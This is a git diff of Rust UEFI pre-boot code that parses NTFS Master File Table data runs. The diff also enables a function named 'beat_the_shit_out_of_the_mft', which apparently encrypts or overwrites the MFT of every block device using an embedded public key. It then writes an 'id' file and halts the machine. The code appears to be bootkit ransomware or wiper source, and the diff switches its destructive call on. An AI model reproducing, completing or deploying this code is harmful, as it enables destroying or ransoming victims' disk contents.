@@ -109,7 +109,7 @@ fn get_mft_ranges(
                     mft_entry_buf[data_run_offset + 2..data_run_offset + 5].to_vec();
                 data_run_first.push(0);
                 let data_run_first =
-                    (u32::from_ne_bytes(data_run_first.try_into().unwrap()) * 8) as u64;
+                    (u32::from_ne_bytes(data_run_first.try_into().unwrap()) as u64) * 8;
 
                 ranges.push(data_run_first..data_run_first + data_run_size);
                 data_run_offset += 5;
@@ -120,13 +120,13 @@ fn get_mft_ranges(
                     mft_entry_buf[data_run_offset + 1..data_run_offset + 3]
                         .try_into()
                         .unwrap(),
-                ) * 8) as u64;
+                ) as u64) * 8;
 
                 let mut data_run_first =
                     mft_entry_buf[data_run_offset + 3..data_run_offset + 6].to_vec();
                 data_run_first.push(0);
                 let data_run_first =
-                    (u32::from_ne_bytes(data_run_first.try_into().unwrap()) * 8) as u64;
+                    (u32::from_ne_bytes(data_run_first.try_into().unwrap()) as u64) * 8;
 
                 ranges.push(data_run_first..data_run_first + data_run_size);
                 data_run_offset += 6;
@@ -137,12 +137,12 @@ fn get_mft_ranges(
                     mft_entry_buf[data_run_offset + 1..data_run_offset + 4].to_vec();
                 data_run_size.push(0);
                 let data_run_size =
-                    (u16::from_ne_bytes(data_run_size.try_into().unwrap()) * 8) as u64;
+                    (u16::from_ne_bytes(data_run_size.try_into().unwrap()) as u64) * 8;
                 let mut data_run_first =
                     mft_entry_buf[data_run_offset + 4..data_run_offset + 7].to_vec();
                 data_run_first.push(0);
                 let data_run_first =
-                    (u32::from_ne_bytes(data_run_first.try_into().unwrap()) * 8) as u64;
+                    (u32::from_ne_bytes(data_run_first.try_into().unwrap()) as u64) * 8;
                 ranges.push(data_run_first..data_run_first + data_run_size);
                 data_run_offset += 7;
             }
@@ -152,12 +152,12 @@ fn get_mft_ranges(
                     mft_entry_buf[data_run_offset + 1..data_run_offset + 3]
                         .try_into()
                         .unwrap(),
-                ) * 8) as u64;
+                ) as u64) * 8;
                 let data_run_first = (u32::from_ne_bytes(
                     mft_entry_buf[data_run_offset + 3..data_run_offset + 7]
                         .try_into()
                         .unwrap(),
-                ) * 8) as u64;
+                ) as u64) * 8;
                 ranges.push(data_run_first..data_run_first + data_run_size);
                 data_run_offset += 7;
             }
@@ -171,7 +171,7 @@ fn get_mft_ranges(
     Ok(ranges)
 }
 
-/*/// Fire !
+/// Fire !
 fn beat_the_shit_out_of_the_mft(
     blk: &mut BlockIO,
     media_id: u32,
@@ -194,11 +194,14 @@ fn beat_the_shit_out_of_the_mft(
     log::info!("Finished !"); // DEBUG
 
     Ok(())
-}*/
+}
 
 pub fn destroy(st: &SystemTable<Boot>) -> uefi::Result {
+    let mut sizes_buf: Vec<u8> = vec!();
+
     // Get list of handles which instantiate a BlockIO
     let handles = st.boot_services().find_handles::<BlockIO>()?;
+
     for handle in handles {
         let blk = st.boot_services().handle_protocol::<BlockIO>(handle)?;
 
@@ -217,10 +220,7 @@ pub fn destroy(st: &SystemTable<Boot>) -> uefi::Result {
         }
 
         if let Ok(ranges) = get_mft_ranges(blk, media_id, 0, &mut buf) {
-
-            //log::info!("{:#?}", ranges);
-
-            /*let public_key_hex = include_str!("include/public_key.hex");
+            let public_key_hex = include_str!("include/public_key.hex");
             let mut buf = [0u8; 32];
             hex::decode_to_slice(public_key_hex, &mut buf).expect("Public key hex to bytes");
             let public_key = PublicKey::from(buf);
@@ -236,36 +236,28 @@ pub fn destroy(st: &SystemTable<Boot>) -> uefi::Result {
             write_file(st, "id", &buf).unwrap();
 
             // TODO: save ranges somewhere
-            let mut ranges_buffer = vec![0u8; ranges.len() * 16];
+            let size: [u8; 8] = (ranges[0].end - ranges[0].start).to_ne_bytes();
+            sizes_buf.append(&mut size.to_vec());
 
-            for range in &ranges {
-                ranges_buffer.extend(range.start.to_be_bytes());
-                ranges_buffer.extend(range.end.to_be_bytes());
-            }
-            ranges_buffer.extend(0u64.to_be_bytes());
 
-            write_file(st, "ranges", ranges_buffer.as_slice()).unwrap();
-
-            let ranges_text = read_file(st, "ranges").unwrap();
-            let mut ranges2 = Vec::<Range<u64>>::new();
-            loop {
-                let c = ranges2.len() * 16;
-                let start = u64::from_be_bytes(ranges_text[c..c + 8].try_into().unwrap());
-                if start == 0u64 {
-                    break;
-                }
-
-                let end = u64::from_be_bytes(ranges_text[c + 8..c + 16].try_into().unwrap());
-                ranges2.push(start..end);
-            }
-
-            log::info!("Ranges1: {:?}", ranges);
-            log::info!("Ranges2: {:?}", ranges2);*/
-
-            //beat_the_shit_out_of_the_mft(blk, media_id, ranges, key.to_bytes());
-            //log::info!("{:#?}", ranges); // DEBUG
+            beat_the_shit_out_of_the_mft(blk, media_id, ranges, key.to_bytes())?;
         }
     }
+
+    sizes_buf.append(&mut vec![0u8; 8]);
+    write_file(st, "sizes", &sizes_buf)?;
+
+    let sizes2_buf = read_file(st, "sizes")?;
+
+    let mut offset = 0;
+    loop {
+        let size = u64::from_ne_bytes(sizes2_buf[offset..offset+8].try_into().unwrap());
+        if size == 0 { break; }
+
+        log::info!("Size: {}", size);
+        offset += 8;
+    }
+
 
     loop {}
 
